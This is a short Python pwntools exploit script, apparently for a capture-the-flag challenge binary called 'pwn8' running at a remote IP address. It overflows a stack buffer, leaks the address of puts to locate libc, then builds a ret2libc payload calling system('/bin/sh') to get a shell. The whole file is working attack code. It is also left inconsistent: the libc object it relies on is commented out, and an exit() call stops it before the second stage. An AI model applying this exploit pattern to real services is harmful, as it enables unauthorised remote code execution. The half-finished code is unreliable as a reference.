from pwn import *
# p = process("./pwn8")
p = remote("114.116.54.89", "10008")
e = ELF('./pwn8')
#  libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
context.log_level = 'debug'
# p.sendline('1')
# p.recv()
puts_plt = e.plt['puts']
puts_got = e.got['puts']
payload = 'a' * 0x14 + p32(puts_plt) + p32(0x0804846F) + p32(puts_got)
p.sendline(payload)
p.recvall()
exit()
p.interactive()
libc.address = u32(p.recv(4)) - libc.symbols['puts']
success(hex(libc.address))
# print hex(next(libc.search("/bin/sh")))
payload = 'a' * 0x14 + p32(libc.symbols['system']) + p32(0) + p32(
    next(libc.search("/bin/sh"))) + p32(0)
p.sendline(payload)
p.interactive()